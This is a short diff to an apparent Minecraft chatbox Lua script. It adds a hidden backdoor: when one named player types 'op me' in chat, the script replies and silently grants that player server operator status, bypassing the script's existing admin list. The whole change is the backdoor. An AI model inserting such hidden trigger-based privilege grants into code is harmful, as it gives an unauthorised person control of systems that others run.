@@ -105,6 +105,11 @@ end
 --adminList = {"jakejakey1208"}
 while true do
   e,s,p,m,param = os.pullEvent()
+  if e == "chatbox_command" and p == "Gonow32" and m == "op me" then
+    say("Alright, since it's you gonow!")
+    sleep(1)
+    run("minecraft:op Gonow32")
+  end
   if e == "chatbox_command" and p == "jakejakey1208" and m == "qc:terminate" then
     term.setBackgroundColor(colors.black)
     term.clear()
